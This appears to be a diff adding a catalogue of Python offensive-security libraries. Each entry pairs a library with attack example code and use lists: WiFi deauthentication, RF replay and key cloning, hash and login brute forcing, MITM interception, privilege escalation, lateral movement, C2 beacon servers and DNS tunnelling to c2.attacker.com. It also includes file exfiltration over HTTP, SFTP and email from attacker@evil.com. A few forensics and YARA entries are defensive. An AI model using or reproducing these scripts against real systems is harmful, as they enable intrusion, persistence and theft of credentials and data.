+                        description: "Packet crafting for wireless attacks",
+                        import: "from scapy.all import *",
+                        example: `# scapy - WiFi deauth attack\nfrom scapy.all import *\n\n# WiFi deauthentication\ntarget_mac = '00:11:22:33:44:55'\nap_mac = 'AA:BB:CC:DD:EE:FF'\n\ndot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)\ndeauth = RadioTap()/dot11/Dot11Deauth(reason=7)\n\n# Send deauth packets\nsendp(deauth, iface='wlan0mon', count=100, inter=0.1)`,
+                        uses: [
+                            "WiFi deauthentication attacks",
+                            "Evil twin AP creation",
+                            "WPA handshake capture",
+                            "Beacon frame injection",
+                            "Wireless traffic analysis"
+                        ]
+                    },
+                    {
+                        name: "pybluez",
+                        description: "Bluetooth Python extension",
+                        import: "import bluetooth",
+                        example: `# pybluez - Bluetooth device discovery\nimport bluetooth\n\n# Discover nearby devices\nprint("Scanning for Bluetooth devices...")\nnearby_devices = bluetooth.discover_devices(\n    duration=8,\n    lookup_names=True,\n    flush_cache=True\n)\n\nfor addr, name in nearby_devices:\n    print(f"Device: {name} - {addr}")\n    \n    # Find services\n    services = bluetooth.find_service(address=addr)\n    for svc in services:\n        print(f"  Service: {svc['name']}")`,
+                        uses: [
+                            "Bluetooth device enumeration",
+                            "Service discovery and profiling",
+                            "Bluetooth connection hijacking",
+                            "BlueBorne exploitation",
+                            "Bluetooth fuzzing attacks"
+                        ]
+                    },
+                    {
+                        name: "pyserial",
+                        description: "Serial port communication",
+                        import: "import serial",
+                        example: `# pyserial - UART hardware hacking\nimport serial\nimport time\n\n# Connect to UART interface\nser = serial.Serial('/dev/ttyUSB0', 115200)\n\n# Send commands\nser.write(b'help\\n')\ntime.sleep(1)\n\n# Read response\nwhile ser.in_waiting:\n    line = ser.readline().decode()\n    print(line)\n    \n    # Look for credentials\n    if 'password' in line.lower():\n        print(f"Found: {line}")`,
+                        uses: [
+                            "UART interface exploitation",
+                            "Serial console access",
+                            "Firmware extraction via serial",
+                            "IoT device debugging interfaces",
+                            "Hardware debugging exploitation"
+                        ]
+                    },
+                    {
+                        name: "rfcat",
+                        description: "RF transceiver control",
+                        import: "from rflib import *",
+                        example: `# rfcat - RF signal analysis and replay\nfrom rflib import *\n\n# Initialize radio\nd = RfCat()\nd.setFreq(433000000)  # 433 MHz\nd.setMdmModulation(MOD_ASK_OOK)\n\n# Capture signal\nprint("Capturing...")\nd.setModeRX()\ndata = d.RFrecv()\nprint(f"Captured: {data.encode('hex')}")\n\n# Replay attack\nprint("Replaying...")\nd.setModeTX()\nd.RFxmit(data * 10)`,
+                        uses: [
+                            "RF signal capture and replay",
+                            "Garage door and car key cloning",
+                            "Wireless sensor exploitation",
+                            "Sub-GHz protocol analysis",
+                            "Signal jamming and interference"
+                        ]
+                    },
+                    {
+                        name: "paho-mqtt",
+                        description: "MQTT protocol client",
+                        import: "import paho.mqtt.client as mqtt",
+                        example: `# paho-mqtt - IoT MQTT exploitation\nimport paho.mqtt.client as mqtt\n\ndef on_message(client, userdata, message):\n    print(f"Topic: {message.topic}")\n    print(f"Payload: {message.payload.decode()}")\n\nclient = mqtt.Client()\nclient.on_message = on_message\n\n# Connect to MQTT broker\nclient.connect('iot.target.com', 1883)\n\n# Subscribe to all topics\nclient.subscribe('#')\n\n# Publish malicious command\nclient.publish('devices/cmd', '{\"action\":\"unlock\"}')`,
+                        uses: [
+                            "MQTT broker enumeration",
+                            "IoT device command injection",
+                            "Message interception and manipulation",
+                            "Unauthenticated broker exploitation",
+                            "Smart home device control"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 16
+            {
+                name: "Cryptanalysis & Hash Cracking",
+                description: "Breaking encryption, hash cracking, cryptographic attacks",
+                when_to_use: "Password recovery, weak crypto exploitation, hash analysis",
+                icon: "🔓",
+                libraries: [
+                    {
+                        name: "hashcat-python",
+                        description: "Python wrapper for Hashcat",
+                        import: "# Hashcat wrapper",
+                        example: `# hashcat - GPU-accelerated cracking\nimport subprocess\n\ndef crack_hash(hash_file, wordlist):\n    cmd = [\n        'hashcat',\n        '-m', '0',  # MD5\n        '-a', '0',  # Dictionary attack\n        hash_file,\n        wordlist,\n        '--force'\n    ]\n    \n    result = subprocess.run(cmd, capture_output=True)\n    \n    # Parse results\n    if b'Cracked' in result.stdout:\n        print("Hash cracked!")\n        return True\n    return False`,
+                        uses: [
+                            "GPU-accelerated password cracking",
+                            "Multi-algorithm hash breaking",
+                            "Dictionary and brute force attacks",
+                            "Rule-based password generation",
+                            "WPA/WPA2 handshake cracking"
+                        ]
+                    },
+                    {
+                        name: "passlib",
+                        description: "Password hashing library",
+                        import: "from passlib.hash import bcrypt, md5_crypt",
+                        example: `# passlib - Hash identification and cracking\nfrom passlib.hash import bcrypt, md5_crypt, sha512_crypt\nfrom passlib.context import CryptContext\n\n# Identify hash type\nhash_str = '$2b$12$abc...'\nif bcrypt.identify(hash_str):\n    print("Bcrypt hash detected")\n\n# Brute force bcrypt\nwith open('rockyou.txt') as f:\n    for password in f:\n        if bcrypt.verify(password.strip(), hash_str):\n            print(f"Password: {password.strip()}")\n            break`,
+                        uses: [
+                            "Hash type identification",
+                            "Password hash verification",
+                            "Multi-format hash cracking",
+                            "Bcrypt/Argon2 analysis",
+                            "Custom hash algorithm testing"
+                        ]
+                    },
+                    {
+                        name: "z3-solver",
+                        description: "SMT constraint solver",
+                        import: "from z3 import *",
+                        example: `# z3 - Solve cryptographic constraints\nfrom z3 import *\n\n# Reverse engineer algorithm\nx = BitVec('x', 32)\ny = BitVec('y', 32)\n\n# Known constraints from binary\ns = Solver()\ns.add(x + y == 42)\ns.add(x * y == 400)\n\nif s.check() == sat:\n    m = s.model()\n    print(f"x = {m[x]}, y = {m[y]}")`,
+                        uses: [
+                            "Constraint-based crypto breaking",
+                            "Reverse engineering crypto algorithms",
+                            "SAT solver for logical puzzles",
+                            "Mathematical problem solving",
+                            "CTF cryptography challenges"
+                        ]
+                    },
+                    {
+                        name: "pycryptodome",
+                        description: "Cryptographic library",
+                        import: "from Crypto.Cipher import AES",
+                        example: `# pycryptodome - Weak crypto exploitation\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\nimport itertools\n\n# Brute force AES key (weak key space)\nciphertext = b'...'\niv = b'...'\n\nfor key_candidate in itertools.product(range(256), repeat=16):\n    try:\n        key = bytes(key_candidate)\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        plaintext = unpad(cipher.decrypt(ciphertext), 16)\n        if b'flag{' in plaintext:\n            print(f"Key found: {key.hex()}")\n            break\n    except:\n        pass`,
+                        uses: [
+                            "Weak key brute forcing",
+                            "ECB mode exploitation",
+                            "Padding oracle attacks",
+                            "Custom cipher implementation",
+                            "Cryptographic primitive testing"
+                        ]
+                    },
+                    {
+                        name: "john-wrapper",
+                        description: "John the Ripper wrapper",
+                        import: "# John the Ripper automation",
+                        example: `# john - Password cracking automation\nimport subprocess\nimport re\n\ndef crack_shadow(shadow_file):\n    # Unshadow first\n    subprocess.run(['unshadow', '/etc/passwd', shadow_file, \n                   '-o', 'combined.txt'])\n    \n    # Run John\n    subprocess.run(['john', '--wordlist=rockyou.txt', \n                   'combined.txt'])\n    \n    # Show results\n    result = subprocess.run(['john', '--show', 'combined.txt'],\n                          capture_output=True)\n    \n    # Parse cracked passwords\n    for line in result.stdout.decode().split('\\n'):\n        if ':' in line:\n            user, pwd = line.split(':', 1)\n            print(f"Cracked: {user} = {pwd}")`,
+                        uses: [
+                            "Linux shadow file cracking",
+                            "Windows SAM hash cracking",
+                            "ZIP/RAR password recovery",
+                            "SSH private key cracking",
+                            "Multi-format hash breaking"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 17
+            {
+                name: "Digital Forensics & Memory Analysis",
+                description: "Memory forensics, malware analysis, incident response",
+                when_to_use: "Memory dump analysis, malware detection, evidence collection",
+                icon: "🔬",
+                libraries: [
+                    {
+                        name: "volatility3",
+                        description: "Memory forensics framework",
+                        import: "# Volatility3 framework",
+                        example: `# volatility3 - Memory analysis\nimport subprocess\n\ndef analyze_memory_dump(dump_file):\n    # List processes\n    result = subprocess.run([\n        'vol', '-f', dump_file,\n        'windows.pslist.PsList'\n    ], capture_output=True, text=True)\n    \n    print(result.stdout)\n    \n    # Extract passwords\n    subprocess.run([\n        'vol', '-f', dump_file,\n        'windows.hashdump.Hashdump'\n    ])\n    \n    # Find hidden processes\n    subprocess.run([\n        'vol', '-f', dump_file,\n        'windows.psscan.PsScan'\n    ])`,
+                        uses: [
+                            "Extract credentials from memory dumps",
+                            "Process and DLL enumeration",
+                            "Network connection recovery",
+                            "Registry hive extraction",
+                            "Malware artifact detection"
+                        ]
+                    },
+                    {
+                        name: "yara-python",
+                        description: "Malware pattern matching",
+                        import: "import yara",
+                        example: `# yara - Malware detection\nimport yara\n\n# Define YARA rule\nrule = '''\nrule Ransomware {\n    strings:\n        $encrypt = "AES" ascii\n        $bitcoin = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/\n        $extension = \".locked\" ascii\n    condition:\n        2 of them\n}\n'''\n\n# Compile and scan\nrules = yara.compile(source=rule)\nmatches = rules.match('suspicious_file.exe')\n\nif matches:\n    print(f"Malware detected: {matches[0].rule}")`,
+                        uses: [
+                            "Malware identification and classification",
+                            "IOC matching in files and memory",
+                            "Custom detection rule creation",
+                            "Threat hunting automation",
+                            "Behavioral pattern detection"
+                        ]
+                    },
+                    {
+                        name: "pefile",
+                        description: "PE file parser",
+                        import: "import pefile",
+                        example: `# pefile - Analyze Windows executables\nimport pefile\n\npe = pefile.PE('malware.exe')\n\n# Check for packed executable\nif pe.OPTIONAL_HEADER.SizeOfRawData < pe.OPTIONAL_HEADER.SizeOfImage:\n    print("Possibly packed!")\n\n# Extract imports\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\n    print(f"DLL: {entry.dll.decode()}")\n    for imp in entry.imports:\n        print(f"  {imp.name.decode()}")\n\n# Find suspicious imports\nsuspicious = ['VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread']\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\n    for imp in entry.imports:\n        if imp.name and imp.name.decode() in suspicious:\n            print(f"Suspicious: {imp.name.decode()}")`,
+                        uses: [
+                            "PE structure analysis",
+                            "Import/export table parsing",
+                            "Packed binary detection",
+                            "Resource extraction",
+                            "Digital signature verification"
+                        ]
+                    },
+                    {
+                        name: "oletools",
+                        description: "MS Office malware analysis",
+                        import: "from oletools import olevba",
+                        example: `# oletools - Extract malicious macros\nfrom oletools.olevba import VBA_Parser\n\nvba = VBA_Parser('malicious_doc.docm')\n\n# Extract all VBA code\nfor (filename, stream_path, vba_filename, vba_code) in vba.extract_all_macros():\n    print(f"Macro in {vba_filename}:")\n    print(vba_code)\n    \n# Analyze for IOCs\nresults = vba.analyze_macros()\nfor kw_type, keyword, description in results:\n    if kw_type == 'Suspicious':\n        print(f"Found: {keyword} - {description}")`,
+                        uses: [
+                            "VBA macro extraction and analysis",
+                            "Malicious document detection",
+                            "OLE structure parsing",
+                            "Office exploit identification",
+                            "Embedded object extraction"
+                        ]
+                    },
+                    {
+                        name: "exiftool-python",
+                        description: "Metadata extraction",
+                        import: "import exiftool",
+                        example: `# exiftool - Metadata forensics\nimport subprocess\nimport json\n\ndef extract_metadata(file_path):\n    result = subprocess.run([\n        'exiftool', '-json', file_path\n    ], capture_output=True, text=True)\n    \n    metadata = json.loads(result.stdout)[0]\n    \n    # Extract geolocation\n    if 'GPSLatitude' in metadata:\n        print(f"Location: {metadata['GPSLatitude']}, {metadata['GPSLongitude']}")\n    \n    # Check for hidden data\n    if 'Comment' in metadata:\n        print(f"Hidden comment: {metadata['Comment']}")`,
+                        uses: [
+                            "Image EXIF data extraction",
+                            "Geolocation tracking from photos",
+                            "Hidden metadata discovery",
+                            "Document author identification",
+                            "Creation timestamp analysis"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 18 - Password Cracking & Brute Force
+            {
+                name: "Password Cracking & Brute Force",
+                description: "Password attack tools, wordlist generation, brute forcing",
+                when_to_use: "Credential attacks, password recovery, authentication bypass",
+                icon: "🔑",
+                libraries: [
+                    {name: "hashlib", description: "Built-in hash library", import: "import hashlib", example: `import hashlib\n\nwith open('rockyou.txt') as f:\n    for pwd in f:\n        hash_obj = hashlib.md5(pwd.strip().encode())\n        if hash_obj.hexdigest() == target_hash:\n            print(f'Found: {pwd.strip()}')`, uses: ["MD5/SHA password cracking", "Hash comparison attacks", "Rainbow table generation", "Password verification", "Hash-based authentication bypass"]},
+                    {name: "itertools", description: "Combinatoric generators", import: "import itertools", example: `import itertools\nimport string\n\nchars = string.ascii_lowercase + string.digits\nfor pwd in itertools.product(chars, repeat=4):\n    attempt = ''.join(pwd)\n    if try_login(target, attempt):\n        print(f'Password: {attempt}')\n        break`, uses: ["Brute force password generation", "Combinatorial attack patterns", "Character set permutations", "Custom wordlist creation", "Exhaustive key search"]},
+                    {name: "passlib", description: "Password hashing library", import: "from passlib.hash import bcrypt", example: `from passlib.hash import bcrypt, sha256_crypt\n\nhash_str = '$2b$12$...'\nwith open('wordlist.txt') as f:\n    for pwd in f:\n        if bcrypt.verify(pwd.strip(), hash_str):\n            print(f'Cracked: {pwd}')\n            break`, uses: ["Multi-algorithm hash verification", "Bcrypt/Scrypt cracking", "Hash format identification", "Password strength testing", "Custom hash schemes"]},
+                    {name: "requests", description: "HTTP brute forcing", import: "import requests", example: `import requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef try_login(username, password):\n    r = requests.post('http://target/login',\n        data={'user': username, 'pass': password})\n    return 'Welcome' in r.text\n\nwith open('passwords.txt') as f:\n    with ThreadPoolExecutor(max_workers=10) as executor:\n        results = executor.map(lambda p: try_login('admin', p), f)`, uses: ["HTTP form brute forcing", "Multi-threaded login attacks", "Session-based authentication bypass", "API key enumeration", "Token brute forcing"]},
+                    {name: "pycrunch", description: "Wordlist generator", import: "# Custom wordlist generation", example: `import string\nimport itertools\n\ndef generate_wordlist(min_len, max_len, chars):\n    for length in range(min_len, max_len + 1):\n        for combo in itertools.product(chars, repeat=length):\n            yield ''.join(combo)\n\nchars = string.ascii_lowercase\nfor word in generate_wordlist(4, 6, chars):\n    print(word)`, uses: ["Custom wordlist generation", "Rule-based password creation", "Targeted dictionary building", "Permutation generation", "Mask-based attacks"]}
+                ]
+            },
+            // CATEGORY 19 - Web Proxies & Traffic Manipulation
+            {
+                name: "Web Proxies & Traffic Interception",
+                description: "HTTP proxies, traffic manipulation, request/response modification",
+                when_to_use: "MITM attacks, traffic analysis, request manipulation",
+                icon: "🔀",
+                libraries: [
+                    {name: "mitmproxy", description: "Interactive HTTPS proxy", import: "from mitmproxy import http", example: `from mitmproxy import http\n\ndef request(flow):\n    if 'api.target.com' in flow.request.pretty_host:\n        flow.request.headers['X-Auth'] = 'admin_token'\n\ndef response(flow):\n    if 'password' in flow.response.text:\n        print(f'Password found: {flow.response.text}')`, uses: ["HTTPS traffic interception", "Request/response modification", "SSL/TLS MITM attacks", "API manipulation", "Session hijacking"]},
+                    {name: "pydivert", description: "WinDivert Python binding", import: "import pydivert", example: `import pydivert\n\nwith pydivert.WinDivert('tcp.DstPort == 80') as w:\n    for packet in w:\n        if b'POST' in packet.payload:\n            print(packet.payload)\n        w.send(packet)`, uses: ["Windows packet interception", "Real-time packet modification", "Protocol manipulation", "Traffic redirection", "Network monitoring"]},
+                    {name: "netfilterqueue", description: "Linux packet queue manipulation", import: "from netfilterqueue import NetfilterQueue", example: `from netfilterqueue import NetfilterQueue\nimport scapy.all as scapy\n\ndef process_packet(packet):\n    scapy_packet = scapy.IP(packet.get_payload())\n    if scapy_packet.haslayer(scapy.Raw):\n        payload = scapy_packet[scapy.Raw].load\n        if b'password' in payload:\n            print(f'Captured: {payload}')\n    packet.accept()\n\nnfqueue = NetfilterQueue()\nnfqueue.bind(0, process_packet)\nnfqueue.run()`, uses: ["Linux packet queue manipulation", "Iptables packet interception", "Real-time traffic modification", "Protocol fuzzing", "Network attack automation"]},
+                    {name: "twisted", description: "Event-driven networking engine", import: "from twisted.internet import reactor", example: `from twisted.internet import protocol, reactor\n\nclass ProxyProtocol(protocol.Protocol):\n    def dataReceived(self, data):\n        print(f'Intercepted: {data}')\n        # Modify and forward\n        modified = data.replace(b'admin', b'user')\n        self.transport.write(modified)\n\nfactory = protocol.Factory()\nfactory.protocol = ProxyProtocol\nreactor.listenTCP(8080, factory)\nreactor.run()`, uses: ["Custom proxy server creation", "Protocol implementation", "Asynchronous networking", "Event-driven MITM", "Network service emulation"]},
+                    {name: "proxybroker", description: "Proxy server finder", import: "from proxybroker import Broker", example: `from proxybroker import Broker\nimport asyncio\n\nasync def find_proxies():\n    proxies = []\n    broker = Broker()\n    async for proxy in broker.find(types=['HTTP', 'HTTPS'], limit=10):\n        proxies.append(f'{proxy.host}:{proxy.port}')\n    return proxies\n\nproxies = asyncio.run(find_proxies())`, uses: ["Anonymous proxy discovery", "Proxy chain building", "Hiding attacker IP", "Distributed attack infrastructure", "Geolocation-based proxies"]}
+                ]
+            },
+            // CATEGORY 20 - Privilege Escalation
+            {
+                name: "Privilege Escalation",
+                description: "Linux/Windows privilege escalation, SUID/sudo exploitation",
+                when_to_use: "Gaining root/admin access, escaping restricted shells",
+                icon: "⬆️",
+                libraries: [
+                    {name: "os", description: "OS interaction for privesc", import: "import os", example: `import os\nimport subprocess\n\n# Check for SUID binaries\nresult = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f'],\n    capture_output=True, text=True, stderr=subprocess.DEVNULL)\n\nfor line in result.stdout.split('\\n'):\n    if line:\n        print(f'SUID: {line}')`, uses: ["SUID binary exploitation", "Environment variable manipulation", "Path hijacking attacks", "Command injection for privesc", "Capability abuse"]},
+                    {name: "subprocess", description: "Command execution", import: "import subprocess", example: `import subprocess\n\n# Exploit sudo misconfiguration\nsudo_list = subprocess.run(['sudo', '-l'],\n    capture_output=True, text=True)\n\nif 'NOPASSWD' in sudo_list.stdout:\n    print('Exploitable sudo config found')\n    # Extract exploitable commands\n    for line in sudo_list.stdout.split('\\n'):\n        if 'NOPASSWD' in line:\n            print(f'Can run without password: {line}')`, uses: ["Sudo misconfiguration exploitation", "GTFOBins command abuse", "Wildcard injection", "Command substitution attacks", "Shell escape sequences"]},
+                    {name: "psutil", description: "Process and system info", import: "import psutil", example: `import psutil\nimport os\n\n# Find privileged processes\nfor proc in psutil.process_iter(['pid', 'name', 'username']):\n    try:\n        if proc.info['username'] == 'root':\n            print(f"Root process: {proc.info['name']} (PID: {proc.info['pid']})")\n            # Check for exploitation opportunities\n            cmdline = proc.cmdline()\n            if cmdline:\n                print(f"  Command: {' '.join(cmdline)}")\n    except:\n        pass`, uses: ["Privileged process enumeration", "Service exploitation identification", "Memory scraping for credentials", "Process injection targeting", "Root process hijacking"]},
+                    {name: "ctypes", description: "System call manipulation", import: "import ctypes", example: `import ctypes\nimport os\n\n# Attempt to elevate privileges (Linux)\nlibc = ctypes.CDLL('libc.so.6')\n\n# Try setuid(0)\nresult = libc.setuid(0)\nif result == 0:\n    print('Successfully escalated to root!')\n    os.system('/bin/bash')\nelse:\n    print(f'Failed: {result}')`, uses: ["Direct system call invocation", "UID/GID manipulation", "Capability setting", "Kernel exploitation helpers", "Binary exploitation primitives"]},
+                    {name: "winreg", description: "Windows Registry access", import: "import winreg", example: `import winreg\n\n# Find AlwaysInstallElevated (Windows privesc)\ntry:\n    key1 = winreg.OpenKey(winreg.HKEY_CURRENT_USER,\n        r'SOFTWARE\\Policies\\Microsoft\\Windows\\Installer')\n    val1, _ = winreg.QueryValueEx(key1, 'AlwaysInstallElevated')\n    \n    key2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,\n        r'SOFTWARE\\Policies\\Microsoft\\Windows\\Installer')\n    val2, _ = winreg.QueryValueEx(key2, 'AlwaysInstallElevated')\n    \n    if val1 == 1 and val2 == 1:\n        print('AlwaysInstallElevated is enabled! MSI privesc possible')\nexcept:\n    pass`, uses: ["Registry-based privilege escalation", "AlwaysInstallElevated exploitation", "AutoRun persistence detection", "Service configuration abuse", "Unquoted service paths"]}
+                ]
+            },
+            // CATEGORY 21 - Lateral Movement
+            {
+                name: "Lateral Movement",
+                description: "Moving between systems in a network",
+                when_to_use: "Post-exploitation, spreading through networks",
+                icon: "➡️",
+                libraries: [
+                    {name: "paramiko", description: "SSH lateral movement", import: "import paramiko", example: `import paramiko\n\ndef lateral_ssh(targets, username, key_file):\n    key = paramiko.RSAKey.from_private_key_file(key_file)\n    \n    for target in targets:\n        try:\n            client = paramiko.SSHClient()\n            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n            client.connect(target, username=username, pkey=key)\n            \n            stdin, stdout, stderr = client.exec_command('whoami')\n            print(f'{target}: {stdout.read().decode()}')\n            client.close()\n        except Exception as e:\n            print(f'{target}: Failed')`, uses: ["SSH key-based lateral movement", "Multi-host command execution", "Automated network traversal", "Credential reuse attacks", "Jump box pivoting"]},
+                    {name: "impacket", description: "Windows lateral movement", import: "from impacket.smbconnection import SMBConnection", example: `from impacket.smbconnection import SMBConnection\nfrom impacket.dcerpc.v5 import transport, scmr\n\n# PSExec-style lateral movement\ndef psexec(target, username, password, command):\n    conn = SMBConnection(target, target)\n    conn.login(username, password)\n    \n    # Create service\n    rpctransport = transport.DCERPCTransportFactory(\n        f'ncacn_np:{target}[\\\\pipe\\\\svcctl]')\n    rpctransport.set_credentials(username, password)\n    dce = rpctransport.get_dce_rpc()\n    dce.connect()\n    \n    # Execute command\n    print(f'Executing on {target}')`, uses: ["PSExec lateral movement", "Pass-the-Hash attacks", "WMI command execution", "SMB relay attacks", "DCOM exploitation"]},
+                    {name: "pypsrp", description: "PowerShell Remoting", import: "from pypsrp.client import Client", example: `from pypsrp.client import Client\n\n# PowerShell Remoting\nclient = Client('target.domain.com',\n    username='domain\\user',\n    password='pass',\n    ssl=False)\n\noutput, streams, had_errors = client.execute_ps(\n    'Get-Process | Select-Object Name'\n)\nprint(output)`, uses: ["PowerShell remoting exploitation", "WinRM command execution", "Remote script execution", "Credential theft via PS", "Active Directory reconnaissance"]},
+                    {name: "rpyc", description: "Python RPC framework", import: "import rpyc", example: `import rpyc\n\n# Connect to compromised host\nconn = rpyc.classic.connect('compromised_host')\n\n# Execute commands remotely\nremote_os = conn.modules.os\nresult = remote_os.popen('whoami').read()\nprint(f'Remote user: {result}')\n\n# Upload and execute payload\nwith open('payload.py', 'rb') as f:\n    conn.modules.builtins.open('/tmp/payload.py', 'wb').write(f.read())\nconn.modules.os.system('python3 /tmp/payload.py')`, uses: ["Python-based C2 lateral movement", "Remote code execution via RPC", "File transfer between hosts", "Distributed exploitation", "Agent-based lateral movement"]},
+                    {name: "fabric", description: "SSH automation library", import: "from fabric import Connection", example: `from fabric import Connection, Group\n\n# Parallel execution on multiple hosts\nhosts = ['192.168.1.10', '192.168.1.11', '192.168.1.12']\ngroup = Group(*hosts, user='admin', connect_kwargs={'password': 'pass'})\n\n# Execute on all hosts\nresults = group.run('cat /etc/shadow', hide=True)\nfor conn, result in results.items():\n    print(f'{conn.host}: {result.stdout}')`, uses: ["Automated lateral movement", "Parallel remote execution", "Network-wide command deployment", "SSH-based automation", "Multi-host exploitation"]}
+                ]
+            },
+            // CATEGORY 22 - Command & Control (C2)
+            {
+                name: "Command & Control (C2)",
+                description: "C2 server development, agent communication, backdoors",
+                when_to_use: "Building remote access tools, maintaining persistence",
+                icon: "📻",
+                libraries: [
+                    {name: "flask", description: "Lightweight web framework for C2", import: "from flask import Flask, request", example: `from flask import Flask, request, jsonify\nimport base64\n\napp = Flask(__name__)\ncommand_queue = []\n\n@app.route('/beacon', methods=['POST'])\ndef beacon():\n    agent_data = request.json\n    print(f"Agent {agent_data['id']} checked in")\n    \n    # Send command to agent\n    if command_queue:\n        cmd = command_queue.pop(0)\n        return jsonify({'command': base64.b64encode(cmd.encode()).decode()})\n    return jsonify({'command': None})\n\n@app.route('/results', methods=['POST'])\ndef results():\n    print(f"Results: {request.json['output']}")\n    return 'OK'\n\napp.run(host='0.0.0.0', port=443, ssl_context='adhoc')`, uses: ["HTTP/HTTPS C2 server development", "Agent beacon management", "Command queuing system", "Encrypted communication channels", "RESTful C2 architecture"]},
+                    {name: "socketserver", description: "TCP/UDP server framework", import: "import socketserver", example: `import socketserver\nimport json\n\nclass C2Handler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024).strip()\n        agent_info = json.loads(data.decode())\n        print(f"Agent connected: {agent_info['hostname']}")\n        \n        # Send command\n        command = {'cmd': 'whoami'}\n        self.request.sendall(json.dumps(command).encode())\n        \n        # Receive result\n        result = self.request.recv(4096)\n        print(f"Result: {result.decode()}")\n\nserver = socketserver.TCPServer(('0.0.0.0', 4444), C2Handler)\nserver.serve_forever()`, uses: ["Raw socket C2 servers", "Custom protocol implementation", "Multi-client handling", "Persistent connections", "Binary protocol C2"]},
+                    {name: "twisted", description: "Event-driven networking", import: "from twisted.internet import reactor, protocol", example: `from twisted.internet import reactor, protocol\nimport json\n\nclass C2Protocol(protocol.Protocol):\n    def connectionMade(self):\n        print(f"Agent connected from {self.transport.getPeer()}")\n        self.factory.clients.append(self)\n        \n    def dataReceived(self, data):\n        msg = json.loads(data.decode())\n        print(f"Received: {msg}")\n        \n        # Send command\n        cmd = {'action': 'exec', 'cmd': 'ls -la'}\n        self.transport.write(json.dumps(cmd).encode())\n\nclass C2Factory(protocol.Factory):\n    def __init__(self):\n        self.clients = []\n        \n    def buildProtocol(self, addr):\n        return C2Protocol()\n\nreactor.listenTCP(8000, C2Factory())\nreactor.run()`, uses: ["Scalable C2 infrastructure", "Asynchronous agent handling", "Event-driven architecture", "Multiple simultaneous agents", "High-performance C2"]},
+                    {name: "cryptography", description: "Encrypted C2 communications", import: "from cryptography.fernet import Fernet", example: `from cryptography.fernet import Fernet\nimport socket\nimport json\n\n# C2 server with encryption\nkey = Fernet.generate_key()\ncipher = Fernet(key)\n\ndef c2_server():\n    s = socket.socket()\n    s.bind(('0.0.0.0', 443))\n    s.listen(5)\n    \n    while True:\n        conn, addr = s.accept()\n        # Receive encrypted data\n        encrypted = conn.recv(4096)\n        decrypted = cipher.decrypt(encrypted)\n        data = json.loads(decrypted.decode())\n        \n        print(f"Command from {addr}: {data}")\n        \n        # Send encrypted response\n        response = {'status': 'ok', 'output': 'command_output'}\n        encrypted_resp = cipher.encrypt(json.dumps(response).encode())\n        conn.send(encrypted_resp)`, uses: ["Encrypted C2 channels", "AES-encrypted communications", "Secure agent-server protocol", "Anti-forensics C2", "TLS/SSL C2 tunnels"]},
+                    {name: "dns.resolver", description: "DNS-based C2", import: "import dns.resolver", example: `import dns.resolver\nimport base64\n\n# DNS tunneling C2\ndef send_via_dns(data, domain):\n    # Encode data in subdomain\n    encoded = base64.b32encode(data.encode()).decode().lower()\n    query = f"{encoded}.{domain}"\n    \n    try:\n        answers = dns.resolver.resolve(query, 'TXT')\n        for rdata in answers:\n            # Decode command from TXT record\n            command = base64.b32decode(str(rdata).strip('"').upper())\n            return command.decode()\n    except:\n        return None\n\n# Agent usage\ndata = send_via_dns('BEACON', 'c2.attacker.com')`, uses: ["DNS tunneling for C2", "Covert channel communication", "Firewall bypass via DNS", "Exfiltration through DNS", "Stealth command delivery"]}
+                ]
+            },
+            // CATEGORY 23 - Data Exfiltration
+            {
+                name: "Data Exfiltration",
+                description: "Stealing data from compromised systems",
+                when_to_use: "Data theft, information gathering, credential harvesting",
+                icon: "📤",
+                libraries: [
+                    {name: "requests", description: "HTTP-based exfiltration", import: "import requests", example: `import requests\nimport os\nimport json\n\ndef exfiltrate_files(directory, c2_url):\n    for root, dirs, files in os.walk(directory):\n        for file in files:\n            if file.endswith(('.txt', '.doc', '.pdf')):\n                filepath = os.path.join(root, file)\n                with open(filepath, 'rb') as f:\n                    files_data = {'file': f}\n                    requests.post(f'{c2_url}/upload',\n                        files=files_data,\n                        data={'path': filepath})`, uses: ["HTTP POST exfiltration", "File upload to C2 server", "Chunked data transfer", "Multi-file exfiltration", "Encrypted uploads"]},
+                    {name: "paramiko", description: "SFTP data exfiltration", import: "import paramiko", example: `import paramiko\nimport os\n\ndef sftp_exfil(local_dir, remote_host, username, password):\n    transport = paramiko.Transport((remote_host, 22))\n    transport.connect(username=username, password=password)\n    sftp = paramiko.SFTPClient.from_transport(transport)\n    \n    for root, dirs, files in os.walk(local_dir):\n        for file in files:\n            local_path = os.path.join(root, file)\n            remote_path = f'/exfil/{file}'\n            sftp.put(local_path, remote_path)\n            print(f'Exfiltrated: {file}')\n    \n    sftp.close()\n    transport.close()`, uses: ["SFTP file transfer", "Encrypted data exfiltration", "Bulk file upload", "SSH tunneling for data", "Stealth file transfer"]},
+                    {name: "smtplib", description: "Email-based exfiltration", import: "import smtplib", example: `import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nimport os\n\ndef email_exfil(file_path, to_email):\n    msg = MIMEMultipart()\n    msg['From'] = 'attacker@evil.com'\n    msg['To'] = to_email\n    msg['Subject'] = 'System Report'\n    \n    with open(file_path, 'rb') as f:\n        part = MIMEBase('application', 'octet-stream')\n        part.set_payload(f.read())\n        encoders.encode_base64(part)\n        part.add_header('Content-Disposition',\n            f'attachment; filename={os.path.basename(file_path)}')\n        msg.attach(part)\n    \n    server = smtplib.SMTP('smtp.gmail.com', 587)\n    server.starttls()\n    server.login('user', 'pass')\n    server.send_message(msg)\n    server.quit()`, uses: ["Email attachment exfiltration", "SMTP data theft", "Covert email channels", "Document theft via email", "Automated email exfil"]},
